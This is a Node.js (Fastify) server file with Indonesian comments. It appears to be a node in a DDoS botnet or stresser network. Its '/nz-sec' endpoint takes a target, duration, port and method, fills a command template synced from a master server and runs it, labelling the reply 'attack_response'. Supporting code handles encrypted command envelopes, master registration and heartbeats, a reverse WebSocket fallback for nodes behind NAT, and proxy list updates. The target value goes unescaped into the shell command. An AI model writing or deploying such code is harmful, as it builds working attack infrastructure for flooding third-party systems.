// Helper function untuk fetch dengan timeout
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

import Fastify from 'fastify';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config/config.js';
import * as methodSyncModule from './modules/methodSync.js';
import createHeartbeat from './modules/heartbeat.js';
import createReverseClient from './modules/reverseClient.js';
import createProxyUpdater from './modules/proxyUpdater.js';
import ExecutorClass from './modules/executor.js';

let encryptionManager = null;
let encryptionInitialized = false;

const fastify = Fastify({ logger: false });

// ESM pengganti __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const dbDir = path.join(__dirname, 'database');
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true });
  console.log(`[INIT] Created database directory: ${dbDir}`);
}

// FIX: Proper async initialization untuk encryption
async function initializeEncryption() {
  if (config.ENCRYPTION && config.ENCRYPTION.ENABLED) {
    try {
      const { default: EncryptionManager } = await import('./modules/encryption.js');
      const encryptionConfig = {
        ...config,
        ENCRYPTION: {
          ...config.ENCRYPTION,
          NODE_ID: config.NODE.ID
        }
      };
      encryptionManager = new EncryptionManager(encryptionConfig);
      encryptionInitialized = true;
      console.log('[INIT] Encryption system loaded');
      return true;
    } catch (error) {
      console.error('[INIT] Failed to load encryption:', error.message);
      if (!config.ENCRYPTION) config.ENCRYPTION = {};
      config.ENCRYPTION.ENABLED = false;
      encryptionInitialized = false;
      return false;
    }
  } else {
    console.log('[INIT] Encryption disabled by config');
    encryptionInitialized = false;
    return false;
  }
}

let methodsConfig = {};
let heartbeatModule = null;
let reverseClient = null;
let proxyUpdater = null;
let heartbeatIntervalId = null;
let methodsSyncIntervalId = null;
let backgroundHeartbeat = null;
let backgroundWSHeartbeat = null;
let nodeMode = 'DIRECT';
let isRegistered = false;
let isReachable = false;

const sharedData = {
  config,
  methodsConfig: {},
  executor: null,
  encryptionManager: null,
  proxyUpdater: null,
  nodeMode: 'DIRECT',
  isRegistered: false,
  isReachable: false,
  
  updateMethodsConfig(newConfig) {
    this.methodsConfig = newConfig;
    
    if (heartbeatModule && heartbeatModule.updateMethodsConfig) {
      heartbeatModule.updateMethodsConfig(newConfig);
    }
    
    if (reverseClient && reverseClient.updateMethodsConfig) {
      reverseClient.updateMethodsConfig(newConfig);
    }
    
    console.log(`[SHARED] Methods config updated: ${Object.keys(newConfig).length} methods`);
  },
  
  getMethodsVersionHash() {
    try {
      const { calculateMethodsVersionHash } = methodSyncModule;
      return calculateMethodsVersionHash(this.methodsConfig);
    } catch {
      return 'unknown';
    }
  },
  
  setNodeMode(mode) {
    this.nodeMode = mode;
  },
  
  setRegistered(status) {
    this.isRegistered = status;
  },
  
  setReachable(status) {
    this.isReachable = status;
  },
  
  setProxyUpdater(updater) {
    this.proxyUpdater = updater;
  },
  
  // FIX: Add method to update encryption manager reference
  setEncryptionManager(manager) {
    this.encryptionManager = manager;
  }
};

function loadMethodsConfig() {
  try {
    const methodsWithPaths = methodSyncModule.getMethodsWithAbsolutePaths(config);
    
    if (!methodsWithPaths || Object.keys(methodsWithPaths).length === 0) {
      console.warn('[INIT] Warning: No methods loaded, using empty config');
    }
    
    sharedData.updateMethodsConfig(methodsWithPaths);
    
    return methodsWithPaths;
  } catch (e) {
    console.error('[INIT] Gagal load methods config lokal:', e.message);
    console.error('[INIT] Stack trace:', e.stack);
    sharedData.updateMethodsConfig({});
    return {};
  }
}

function refreshMethodsConfig() {
  try {
    const methodsWithPaths = methodSyncModule.getMethodsWithAbsolutePaths(config);
    sharedData.updateMethodsConfig(methodsWithPaths);
    
    console.log(
      `[METHODS-REFRESH] Methods updated: ${Object.keys(methodsWithPaths).length} methods`
    );
    return methodsWithPaths;
  } catch (e) {
    console.error('[METHODS-REFRESH] Gagal load methods config:', e.message);
    return sharedData.methodsConfig;
  }
}

const executor = new ExecutorClass(config);
sharedData.executor = executor;

executor.on('zombie_detected', (data) => {
  console.log(`[ZOMBIE] Detected ${data.count} zombie process(es)`);
  data.processes.forEach(p => {
    console.log(`[ZOMBIE] Process ${p.processId} overtime: ${Math.round(p.overtime/1000)}s`);
  });

  if (executor.zombieConfig?.autoKill) {
    console.log('[ZOMBIE] AutoKill handled by Executor');
  } else {
    console.log('[ZOMBIE] AutoKill is disabled, manual intervention may be required');
  }
});

const encryptionDecorator = async (request, reply) => {
  try {
    if (!request.body || Object.keys(request.body).length === 0) {
      return;
    }

    // FIX: Check if encryption is initialized before using
    if (request.body.envelope === 'secure' && encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
      const result = encryptionManager.processSecureMessage(request.body);
      if (result.success) {
        request.body = result.data;
        request.encrypted = true;
        request.encryptionMetadata = result.metadata;
      } else {
        console.log('[MIDDLEWARE] Failed to decrypt:', result.error);

        reply.code(401).send({
          status: 'error',
          error: 'Failed to decrypt secure request',
          reason: result.error || 'INVALID_ENCRYPTION'
        });
        throw new Error('ENCRYPTION_DECRYPT_FAILED');
      }
    } else if (request.body.envelope === 'plain') {
      request.body = request.body.payload;
      request.encrypted = false;
    } else {
      request.encrypted = false;
    }
  } catch (error) {
    if (error.message === 'ENCRYPTION_DECRYPT_FAILED') {
      return;
    }
    console.error('[MIDDLEWARE] Encryption middleware error:', error.message);
    request.body = {};
    request.encrypted = false;
  }
};

function sendEncryptedResponse(reply, data, messageType = 'response') {
  // FIX: Check if encryption is fully initialized
  if (encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
    const encrypted = encryptionManager.createSecureMessage(data, messageType);
    reply.send(encrypted);
  } else {
    reply.send(data);
  }
}

function buildCommand(template, params) {
  let cmd = template;
  for (const [key, value] of Object.entries(params)) {
    cmd = cmd.replaceAll(`{${key}}`, String(value));
  }
  return cmd;
}

function validateInput(target, time, reqPort, methods) {
  const errors = [];

  if (!target || !time || !methods) {
    errors.push(config.MESSAGES.REQUIRED_FIELDS);
  }

  if (!sharedData.methodsConfig[methods]) {
    errors.push(config.MESSAGES.INVALID_METHOD);
  }

  const timeNum = Number(time);
  if (!Number.isInteger(timeNum) || timeNum <= 0) {
    errors.push(config.MESSAGES.INVALID_TIME);
  }

  let portNum = reqPort ? Number(reqPort) : config.DEFAULTS.PORT;
  if (
    !Number.isInteger(portNum) ||
    portNum < config.DEFAULTS.PORT_MIN ||
    portNum > config.DEFAULTS.PORT_MAX
  ) {
    errors.push(config.MESSAGES.INVALID_PORT);
  }

  return {
    isValid: errors.length === 0,
    errors,
    validatedData: {
      target,
      time: timeNum,
      port: portNum,
      methods
    }
  };
}

async function fetchServerInfo() {
  try {
    const res = await fetchWithTimeout('https://httpbin.org/get', {}, 5000);
    const data = await res.json();
    console.log(`Server up: http://${data.origin}:${config.SERVER.PORT}`);
  } catch {
    console.log(`Server up on port ${config.SERVER.PORT}`);
  }
}

async function detectPublicIP() {
  try {
    console.log('[IP-DETECT] Mendeteksi IP publik...');
    
    const services = [
      'https://httpbin.org/ip',
      'https://api.ipify.org?format=json',
      'https://ipinfo.io/json',
      'https://ifconfig.me/all.json'
    ];
    
    for (const service of services) {
      try {
        const res = await fetchWithTimeout(service, {}, 5000);
        if (!res.ok) continue;
        
        const data = await res.json();
        let ip = null;
        
        if (service.includes('httpbin')) {
          ip = data.origin;
        } else if (service.includes('ipify')) {
          ip = data.ip;
        } else if (service.includes('ipinfo')) {
          ip = data.ip;
        } else if (service.includes('ifconfig')) {
          ip = data.ip_addr;
        }
        
        if (ip) {
          if (typeof ip === 'string' && ip.includes(',')) {
            ip = ip.split(',')[0].trim();
          }
          
          console.log(`[IP-DETECT] IP publik terdeteksi (${service}): ${ip}`);
          return ip;
        }
      } catch (err) {
        console.log(`[IP-DETECT] Service ${service} gagal: ${err.message}`);
        continue;
      }
    }
    
    console.log('[IP-DETECT] Semua service gagal, tidak dapat deteksi IP publik');
    return null;
    
  } catch (err) {
    console.log('[IP-DETECT] Gagal deteksi IP publik:', err.message || err);
    return null;
  }
}

async function checkNodeReachability(ip, port) {
  if (!config.MASTER?.URL) {
    console.log('[REACHABILITY] MASTER_URL not configured');
    return { reachable: false, reason: 'MASTER_URL not configured' };
  }

  try {
    console.log(`[REACHABILITY] Meminta master cek akses ke node ${ip}:${port}...`);

    let ipToCheck = ip || config.NODE.IP;
    
    // FIX: Better IPv6 handling
    if (ipToCheck === '::1') {
      ipToCheck = '127.0.0.1';
    }
    if (ipToCheck && ipToCheck.startsWith('::ffff:')) {
      ipToCheck = ipToCheck.replace('::ffff:', '');
    }

    const body = {
      node_id: config.NODE.ID,
      ip: ipToCheck,
      port: port || config.SERVER.PORT,
      health_path: '/health'
    };

    const res = await fetchWithTimeout(
      `${config.MASTER.URL}/check-node-reachability`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      },
      15000
    );

    if (!res.ok) {
      const text = await res.text();
      console.error('[REACHABILITY] Master balas error:', res.status, text);
      return {
        reachable: false,
        reason: `master error ${res.status}`
      };
    }

    const data = await res.json();
    console.log('[REACHABILITY] Hasil dari master:', data);

    return {
      reachable: !!data.reachable,
      reason: data.reason || 'No reason provided',
      master_response: data
    };
  } catch (err) {
    console.error('[REACHABILITY] Error cek ke master:', err.message || err);
    return { reachable: false, reason: err.message || String(err) };
  }
}

async function syncMethods() {
  try {
    const { syncMethodsWithMaster } = methodSyncModule;
    const result = await syncMethodsWithMaster(config);
    
    // FIX: Proper await untuk refresh
    if (result && result.success && !result.up_to_date) {
      await new Promise(resolve => setTimeout(resolve, 100)); // Give time for file write
      refreshMethodsConfig();
    }
    
    return result;
  } catch (error) {
    console.error('[SYNC] Error sync methods:', error.message);
    return null;
  }
}

fastify.post('/nz-sec', {
  preHandler: encryptionDecorator
}, async (request, reply) => {
  try {
    const { target, time, port: reqPort, methods } = request.body;

    const validation = validateInput(target, time, reqPort, methods);
    if (!validation.isValid) {
      return sendEncryptedResponse(reply, {
        status: 'error',
        error: validation.errors.join(', ')
      }, 'error');
    }

    const {
      target: validatedTarget,
      time: validatedTime,
      port: validatedPort,
      methods: validatedMethods
    } = validation.validatedData;

    const methodCfg = sharedData.methodsConfig[validatedMethods];
    if (!methodCfg || !methodCfg.cmd) {
      return sendEncryptedResponse(reply, {
        status: 'error',
        error: config.MESSAGES.INVALID_METHOD
      }, 'error');
    }

    const command = buildCommand(methodCfg.cmd, {
      target: validatedTarget,
      time: validatedTime,
      port: validatedPort
    });

    const result = await executor.execute(command, {
      expectedDuration: validatedTime
    });

    console.log('[SECURE-EXEC SUCCESS]', {
      command: command.substring(0, 100) + '...',
      processId: result.processId,
      pid: result.pid
    });

    sendEncryptedResponse(reply, {
      status: 'ok',
      target: validatedTarget,
      time: validatedTime,
      port: validatedPort,
      methods: validatedMethods,
      processId: result.processId,
      pid: result.pid,
      message: config.MESSAGES.EXEC_SUCCESS,
      encrypted: request.encrypted || false
    }, 'attack_response');

  } catch (error) {
    console.error('[SECURE-EXEC ERROR]', error);

    sendEncryptedResponse(reply, {
      status: 'error',
      error: config.MESSAGES.EXEC_ERROR,
      details: error.error || error.message,
      encrypted: request.encrypted || false
    }, 'error');
  }
});

fastify.post('/heartbeat-sec', {
  preHandler: encryptionDecorator
}, async (request, reply) => {
  try {
    if (!heartbeatModule) {
      return sendEncryptedResponse(reply, {
        status: 'error',
        error: 'Heartbeat module not initialized'
      }, 'error');
    }

    const heartbeatData = await heartbeatModule.getSimpleStatus();
    
    sendEncryptedResponse(reply, {
      status: 'ok',
      data: heartbeatData,
      received_encrypted: request.encrypted || false
    }, 'heartbeat_response');

  } catch (error) {
    console.error('[SECURE-HEARTBEAT ERROR]', error);
    sendEncryptedResponse(reply, {
      status: 'error',
      error: 'Failed to generate heartbeat',
      details: error.message
    }, 'error');
  }
});

fastify.get('/process/kill/:id', async (request, reply) => {
  const processId = parseInt(request.params.id, 10);

  if (Number.isNaN(processId)) {
    return reply.status(400).send({
      status: 'error',
      error: 'Invalid process ID'
    });
  }

  const killed = executor.killProcess(processId);

  if (killed) {
    reply.send({
      status: 'ok',
      message: `Process ${processId} killed successfully`
    });
  } else {
    reply.status(404).send({
      status: 'error',
      error: `Process ${processId} not found`
    });
  }
});

fastify.get('/process/kill-all', async (request, reply) => {
  const killed = executor.killAllProcesses();

  reply.send({
    status: 'ok',
    message: `Killed ${killed} processes`
  });
});

fastify.get('/health', async (request, reply) => {
  reply.send({
    status: 'ok',
    node_id: config.NODE.ID,
    timestamp: new Date().toISOString(),
    encryption: encryptionInitialized && !!(config.ENCRYPTION?.ENABLED),
    mode: nodeMode,
    reachable: isReachable,
    methods_count: Object.keys(sharedData.methodsConfig).length,
    ip: config.NODE.IP || 'unknown',
    port: config.SERVER.PORT
  });
});

async function initializeModules() {
  console.log('[INIT] Initializing modules...');
  
  if (!sharedData.executor) {
    sharedData.executor = executor;
  }
  
  // FIX: Initialize encryption first and wait for it
  await initializeEncryption();
  sharedData.setEncryptionManager(encryptionManager);
  
  if (!heartbeatModule) {
    heartbeatModule = createHeartbeat(config, executor, sharedData.methodsConfig);
    console.log('[INIT] Heartbeat module created');
  }
  
  if (config.MASTER?.URL) {
    try {
      console.log('[INIT] Testing connection to master...');
      const testResponse = await fetchWithTimeout(
        config.MASTER.URL + '/api/status',
        {},
        5000
      );
      if (testResponse.ok) {
        console.log('[INIT] ✓ Master server is reachable');
        return true;
      } else {
        console.log('[INIT] ✗ Master server responded with error:', testResponse.status);
        return false;
      }
    } catch (error) {
      console.log('[INIT] ✗ Cannot reach master server:', error.message);
      return false;
    }
  } else {
    console.log('[INIT] MASTER_URL not configured');
    return false;
  }
}

async function determineNetworkMode() {
  console.log('[INIT] Determining network mode...');
  
  const publicIp = await detectPublicIP();
  
  if (!publicIp) {
    console.log('[INIT] No public IP detected, using REVERSE mode');
    return {
      mode: 'REVERSE',
      ip: null,
      reachable: false,
      reason: 'no-public-ip'
    };
  }
  
  config.NODE.IP = publicIp;
  console.log(`[INIT] Public IP detected: ${publicIp}`);
  
  console.log(`[INIT] Checking if master can reach ${publicIp}:${config.SERVER.PORT}...`);
  const reachability = await checkNodeReachability(publicIp, config.SERVER.PORT);
  
  isReachable = reachability.reachable;
  sharedData.setReachable(isReachable);
  
  if (reachability.reachable) {
    console.log('[INIT] ✓ Node is reachable from master, using DIRECT mode');
    return {
      mode: 'DIRECT',
      ip: publicIp,
      reachable: true,
      reason: reachability.reason
    };
  } else {
    console.log('[INIT] ✗ Node is NOT reachable from master, using REVERSE mode');
    console.log(`[INIT] Reason: ${reachability.reason}`);
    
    if (config.MASTER?.WS_URL) {
      console.log('[INIT] WebSocket URL available for reverse mode');
    } else {
      console.log('[INIT] WARNING: WebSocket URL not configured, reverse mode may not work');
    }
    
    return {
      mode: 'REVERSE',
      ip: publicIp,
      reachable: false,
      reason: reachability.reason
    };
  }
}

function startModeBasedOperations(heartbeatInterval, methodsSyncInterval) {
  console.log(`[INIT] Starting operations for ${nodeMode} mode...`);
  
  setTimeout(async () => {
    try {
      console.log('[INIT] Performing initial methods sync...');
      const syncResult = await syncMethods();
      if (syncResult && syncResult.success) {
        console.log(`[INIT] ✓ Methods sync completed`);
      }
    } catch (error) {
      console.error('[INIT] Initial sync error:', error.message);
    }
  }, 1000);
  
  if (nodeMode === 'DIRECT') {
    startDirectMode(heartbeatInterval, methodsSyncInterval);
  } else if (nodeMode === 'REVERSE') {
    startReverseMode(heartbeatInterval, methodsSyncInterval);
  } else {
    startStandaloneMode();
  }
  
  console.log(
    `[INIT] Ready - Methods: ${Object.keys(sharedData.methodsConfig).length}, ` +
    `Encryption: ${config.ENCRYPTION?.ENABLED && encryptionInitialized ? 'ON' : 'OFF'}, ` +
    `Mode: ${nodeMode}, Reachable: ${isReachable ? 'YES' : 'NO'}`
  );
}

function startDirectMode(heartbeatInterval, methodsSyncInterval) {
  console.log('[INIT] Starting DIRECT mode operations...');
  
  setTimeout(async () => {
    if (!heartbeatModule) {
      console.error('[INIT] Heartbeat module not initialized!');
      return;
    }
    console.log('[INIT] Attempting registration to master (DIRECT mode)...');
    
    const registerResult = await heartbeatModule.autoRegister();
    
    if (registerResult.success) {
      console.log('[INIT] ✓ Registration successful (DIRECT mode)');
      isRegistered = true;
      sharedData.setRegistered(true);
      
      startHeartbeatService(heartbeatInterval);
      startPeriodicSync(methodsSyncInterval);
      
    } else {
      console.log('[INIT] ✗ Registration failed (DIRECT mode):', registerResult.error);
      
      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
        console.log('[INIT] Trying fallback to REVERSE mode...');
        nodeMode = 'REVERSE';
        sharedData.setNodeMode('REVERSE');
        startReverseMode(heartbeatInterval, methodsSyncInterval);
      } else {
        console.log('[INIT] Will retry registration in 30 seconds...');
        setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 30000);
      }
    }
  }, 2000);
}

function startReverseMode(heartbeatInterval, methodsSyncInterval) {
  console.log('[INIT] Starting REVERSE mode operations...');
  
  if (!config.MASTER?.WS_URL) {
    console.log('[INIT] ERROR: MASTER.WS_URL not configured for REVERSE mode');
    console.log('[INIT] Falling back to STANDALONE mode');
    startStandaloneMode();
    return;
  }
  
  try {
    reverseClient = createReverseClient(config, executor, sharedData.methodsConfig);
  } catch (error) {
    console.error('[INIT] Failed to create reverse client:', error.message);
    console.log('[INIT] Falling back to STANDALONE mode');
    startStandaloneMode();
    return;
  }
  
  console.log('[REVERSE-INIT] Connecting to master via WebSocket...');
  reverseClient.connect();
  
  // FIX: Better connection state checking
  let connectionCheckAttempts = 0;
  const maxConnectionCheckAttempts = 30;
  
  const setupInterval = setInterval(async () => {
    connectionCheckAttempts++;
    
    if (reverseClient.isConnected && reverseClient.isConnected()) {
      clearInterval(setupInterval);
      console.log('[REVERSE] WebSocket connected, starting setup...');
      
      try {
        const registerResult = await reverseClient.registerWithMaster();
        if (registerResult.success) {
          console.log('[REVERSE] ✓ Registered with master via REST');
          isRegistered = true;
          sharedData.setRegistered(true);
        }
      } catch (error) {
        console.error('[REVERSE] REST registration error:', error.message);
      }
      
      if (reverseClient.startBackgroundHeartbeat) {
        backgroundWSHeartbeat = reverseClient.startBackgroundHeartbeat(heartbeatInterval);
        backgroundWSHeartbeat.start();
        console.log(`[REVERSE] Started WebSocket heartbeat every ${heartbeatInterval}ms`);
      }
      
      methodsSyncIntervalId = setInterval(async () => {
        try {
          const syncResult = await syncMethods();
          if (syncResult && syncResult.success && !syncResult.up_to_date) {
            console.log('[REVERSE-SYNC] Methods updated from master');
          }
        } catch (error) {
          console.error('[REVERSE-SYNC] Error:', error.message);
        }
      }, methodsSyncInterval);
      
    } else if (connectionCheckAttempts >= maxConnectionCheckAttempts) {
      clearInterval(setupInterval);
      console.log('[REVERSE] Connection timeout, will retry in 10 seconds...');
      setTimeout(() => startReverseMode(heartbeatInterval, methodsSyncInterval), 10000);
    }
  }, 1000);
}

function startStandaloneMode() {
  console.log('[INIT] Starting STANDALONE mode - no master connection');
  
  setTimeout(async () => {
    try {
      console.log('[STANDALONE] Performing local methods sync...');
      const syncResult = await syncMethods();
      if (syncResult && syncResult.success) {
        console.log('[STANDALONE] ✓ Methods sync completed');
      }
    } catch (error) {
      console.error('[STANDALONE] Sync error:', error.message);
    }
  }, 2000);
}

function startHeartbeatService(heartbeatInterval) {
  if (heartbeatModule.startBackgroundHeartbeat) {
    backgroundHeartbeat = heartbeatModule.startBackgroundHeartbeat(heartbeatInterval);
    backgroundHeartbeat.start();
    console.log(`[HEARTBEAT] Started background heartbeat every ${heartbeatInterval}ms`);
  } else {
    heartbeatIntervalId = setInterval(() => {
      if (encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
        heartbeatModule.sendEncryptedHeartbeat().catch((err) => {
          console.error('[HEARTBEAT] Error:', err.message);
        });
      } else {
        heartbeatModule.sendHeartbeat().catch((err) => {
          console.error('[HEARTBEAT] Error:', err.message);
        });
      }
    }, heartbeatInterval);
    console.log(`[HEARTBEAT] Started interval heartbeat every ${heartbeatInterval}ms`);
  }
}

function startPeriodicSync(methodsSyncInterval) {
  methodsSyncIntervalId = setInterval(async () => {
    if (!isRegistered) {
      console.log('[PERIODIC-SYNC] Skipped - not registered');
      return;
    }
    
    try {
      const syncResult = await syncMethods();
      if (syncResult && syncResult.success && !syncResult.up_to_date) {
        console.log('[PERIODIC-SYNC] Methods updated from master');
        
        if (heartbeatModule && heartbeatModule.updateMethodsVersion) {
          await heartbeatModule.updateMethodsVersion();
        }
      }
    } catch (error) {
      console.error('[PERIODIC-SYNC] Error:', error.message);
    }
  }, methodsSyncInterval);
  console.log(`[PERIODIC-SYNC] Started periodic sync every ${methodsSyncInterval}ms`);
}

async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
  console.log('[INIT] Retrying registration...');
  
  if (!heartbeatModule) {
    console.error('[INIT] Heartbeat module not available for retry');
    return;
  }
  
  const retryResult = await heartbeatModule.autoRegister();
  
  if (retryResult.success) {
    console.log('[INIT] ✓ Registration successful on retry');
    isRegistered = true;
    sharedData.setRegistered(true);
    
    if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
    if (methodsSyncIntervalId) clearInterval(methodsSyncIntervalId);
    
    startHeartbeatService(heartbeatInterval);
    startPeriodicSync(methodsSyncInterval);
    
  } else {
    console.log('[INIT] ✗ Registration retry failed:', retryResult.error);
    console.log('[INIT] Will retry again in 60 seconds...');
    
    if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
      console.log('[INIT] Switching to REVERSE mode after multiple failures');
      nodeMode = 'REVERSE';
      sharedData.setNodeMode('REVERSE');
      startReverseMode(heartbeatInterval, methodsSyncInterval);
    } else {
      setTimeout(() => retryRegistration(heartbeatInterval, methodsSyncInterval), 60000);
    }
  }
}

function gracefulShutdown(signal) {
  console.log(`\n[SHUTDOWN] Received ${signal}. Shutting down gracefully...`);
  
  // FIX: Clear all intervals
  if (heartbeatIntervalId) {
    clearInterval(heartbeatIntervalId);
    heartbeatIntervalId = null;
  }
  if (methodsSyncIntervalId) {
    clearInterval(methodsSyncIntervalId);
    methodsSyncIntervalId = null;
  }
  
  // FIX: Proper cleanup order
  if (proxyUpdater && proxyUpdater.stopAutoUpdate) {
    proxyUpdater.stopAutoUpdate();
  }
  if (backgroundHeartbeat && backgroundHeartbeat.stop) {
    backgroundHeartbeat.stop();
  }
  if (backgroundWSHeartbeat && backgroundWSHeartbeat.stop) {
    backgroundWSHeartbeat.stop();
  }
  if (reverseClient && reverseClient.shutdown) {
    reverseClient.shutdown();
  }
  if (executor && executor.cleanup) {
    executor.cleanup();
  } else if (executor) {
    const killed = executor.killAllProcesses();
    console.log(`[SHUTDOWN] Killed ${killed} active processes`);
  }
  
  console.log('[SHUTDOWN] Cleanup completed');
  
  // FIX: Close fastify properly
  fastify.close(() => {
    console.log('[SHUTDOWN] Fastify closed');
    process.exit(0);
  });
  
  // Force exit after 5 seconds
  setTimeout(() => {
    console.log('[SHUTDOWN] Force exit');
    process.exit(0);
  }, 5000);
}

// Startup server dengan async/await yang benar
async function startServer() {
  try {
    await fastify.listen({ port: config.SERVER.PORT, host: '0.0.0.0' });
    
    console.log(`Node server started on port ${config.SERVER.PORT}`);
    console.log(`Node ID: ${config.NODE.ID}`);
    console.log(`Encryption: ${config.ENCRYPTION?.ENABLED ? 'ENABLED' : 'DISABLED'}`);

    refreshMethodsConfig();
    console.log(`Loaded ${Object.keys(sharedData.methodsConfig).length} methods`);
    
    if (config.PROXY && config.PROXY.AUTO_UPDATE) {
      try {
        proxyUpdater = createProxyUpdater(config);
        sharedData.setProxyUpdater(proxyUpdater);
        
        const interval = config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
        proxyUpdater.startAutoUpdate(interval);
        console.log(`[PROXY] Auto-update every ${interval} minutes`);
      } catch (error) {
        console.error('[PROXY] Init error:', error.message);
      }
    }

    const masterReachable = await initializeModules();
    
    if (!masterReachable && config.MASTER?.URL) {
      console.log('[INIT] WARNING: Cannot reach master, will try REVERSE mode if WS available');
    }

    // FIX: Test encryption after initialization
    if (config.ENCRYPTION?.ENABLED && encryptionManager && encryptionInitialized) {
      try {
        const testResult = encryptionManager.testEncryption();
        console.log(`[ENCRYPTION-TEST] ${testResult.success ? 'PASSED' : 'FAILED'}`);
        if (!testResult.success && testResult.error) {
          console.error(`[ENCRYPTION-TEST] Error: ${testResult.error}`);
        }
      } catch (error) {
        console.error('[ENCRYPTION-TEST] Error:', error.message);
      }
    }

    const heartbeatInterval = config.MASTER?.HEARTBEAT_INTERVAL || 30000;
    const methodsSyncInterval = config.MASTER?.METHODS_SYNC_INTERVAL || 60000;

    const modeInfo = await determineNetworkMode();
    nodeMode = modeInfo.mode;
    sharedData.setNodeMode(nodeMode);
    isReachable = modeInfo.reachable;
    sharedData.setReachable(isReachable);
    
    console.log(`[INIT] Final mode: ${nodeMode}, Reachable: ${isReachable}`);

    startModeBasedOperations(heartbeatInterval, methodsSyncInterval);

    await fetchServerInfo().catch(() => {});
    
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
}

// Setup signal handlers
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('uncaughtException', (error) => {
  console.error('[FATAL] Uncaught Exception:', error);
  gracefulShutdown('UNCAUGHT_EXCEPTION');
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('[FATAL] Unhandled Rejection at:', promise, 'reason:', reason);
  gracefulShutdown('UNHANDLED_REJECTION');
});

// Start the server
startServer();